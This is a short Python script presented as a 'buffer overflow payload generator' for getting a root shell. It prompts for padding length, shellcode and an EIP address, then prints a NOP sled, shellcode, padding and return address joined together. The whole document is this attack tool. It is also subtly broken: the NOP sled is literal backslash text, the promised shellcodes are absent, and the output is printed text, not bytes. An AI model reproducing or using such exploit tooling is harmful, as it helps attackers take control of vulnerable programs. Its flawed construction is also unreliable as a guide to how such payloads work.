print("WELCOME TO THE BUFFER OVERFLOW PAYLOAD GENERATOR MADE BY MR.PAVITRA JHA") 
print("We have five shell codes for getting a root shell.")
_12 = input("Num of pading-)#( ")
pad = "\x41" * int(_12)
shellcode = input('''--root(Shellcode)kali
|__# ''')
Nop = r"\x90" * 100
Eip = input("your eip-? ")
print("your payload: " + Nop + shellcode + pad + Eip + "    :now your payload is ready!!")

